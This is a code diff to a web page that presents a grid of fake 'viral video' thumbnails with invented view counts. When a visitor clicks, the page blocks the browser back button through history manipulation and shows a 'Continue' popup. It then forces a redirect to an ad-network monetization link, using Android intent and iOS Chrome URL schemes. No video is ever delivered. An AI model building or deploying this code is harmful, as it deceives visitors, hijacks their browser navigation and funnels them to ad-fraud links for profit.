@@ -126,7 +126,12 @@ button:hover{
 
 <script>
 
-// ALL YOUR IMAGES
+<script>
+let accepted = false;
+let popupActive = false;
+
+const smartLink = "https://www.profitablecpmratenetwork.com/xa4v69ebp?key=62079b05ebf5a63f468e7017849264af";
+
 const images = [
 "https://blmnaovxpqcdbyocuhhw.supabase.co/storage/v1/object/public/videos/thumb_afc044e6-455a-42e1-a538-d93f0be54d2b.jpg",
 "https://blmnaovxpqcdbyocuhhw.supabase.co/storage/v1/object/public/videos/thumb_d9b27cd4-f9d8-441e-881a-c8c64d2419bf.jpg",
@@ -144,7 +149,6 @@ const images = [
 "https://blmnaovxpqcdbyocuhhw.supabase.co/storage/v1/object/public/videos/thumb_8bb862ed-a284-4679-9b8b-0c98705613a7.jpg",
 "https://blmnaovxpqcdbyocuhhw.supabase.co/storage/v1/object/public/videos/thumb_df13647c-f19d-4d13-a0ad-ce4ea4289e58.jpg"
 ];
-
 // TITLES
 const titles = [
 "😱 Viral Shock Moment",
@@ -164,11 +168,30 @@ const titles = [
 "🏆 Top Viral Video"
 ];
 
-<script>
-let accepted = false;
-let popupActive = false;
+// GRID LOAD
+const grid = document.getElementById("grid");
 
-const smartLink = "https://www.profitablecpmratenetwork.com/xa4v69ebp?key=62079b05ebf5a63f468e7017849264af";
+images.forEach((img, i) => {
+  const card = document.createElement("div");
+  card.className = "card";
+
+  card.innerHTML = `
+    <img src="${img}">
+    <div class="play">▶</div>
+    <div class="views">1.2M views</div>
+    <div class="badge">HD</div>
+    <div class="card-body">
+      <div class="title">${titles[i]}</div>
+    </div>
+  `;
+
+  card.onclick = () => {
+    lockHistory();
+    showPopup();
+  };
+
+  grid.appendChild(card);
+});
 
 // BACK CONTROL
 function lockHistory(){
@@ -184,7 +207,6 @@ window.onpopstate = function () {
 
 // POPUP
 function showPopup(){
-
   if(accepted || popupActive) return;
   popupActive = true;
 
@@ -202,8 +224,7 @@ function showPopup(){
   popup.innerHTML = `
     <div style="background:#111;padding:25px;border-radius:12px;text-align:center;width:260px;">
       <p style="margin-bottom:20px;">Continue to watch video</p>
-      <button id="continueBtn"
-        style="background:#22c55e;border:none;padding:12px 20px;border-radius:8px;font-weight:bold;">
+      <button id="continueBtn" style="background:#22c55e;border:none;padding:12px 20px;border-radius:8px;font-weight:bold;">
         Continue
       </button>
     </div>
@@ -216,19 +237,15 @@ function showPopup(){
     openExternal();
   };
 
-  setTimeout(()=>{
-    popupActive = false;
-  },1500);
+  setTimeout(()=> popupActive = false, 1500);
 }
 
 // REDIRECT
 function openExternal(){
 
   const ua = navigator.userAgent.toLowerCase();
-  const isAndroid = /android/.test(ua);
-  const isIOS = /iphone|ipad|ipod/.test(ua);
 
-  if(isAndroid){
+  if(/android/.test(ua)){
     window.location.href =
       "intent://" +
       smartLink.replace(/^https?:\/\//,'') +
@@ -238,7 +255,7 @@ function openExternal(){
     return;
   }
 
-  if(isIOS){
+  if(/iphone|ipad|ipod/.test(ua)){
     window.location.href =
       "googlechrome://" +
       smartLink.replace(/^https?:\/\//,'');
@@ -249,12 +266,6 @@ function openExternal(){
 
   window.location.href = smartLink;
 }
-
-// ✅ FIX: EVENT DELEGATION (card problem solved)
-document.getElementById("grid").addEventListener("click", function(){
-  lockHistory();
-  showPopup();
-});
 </script>
 
 </body>
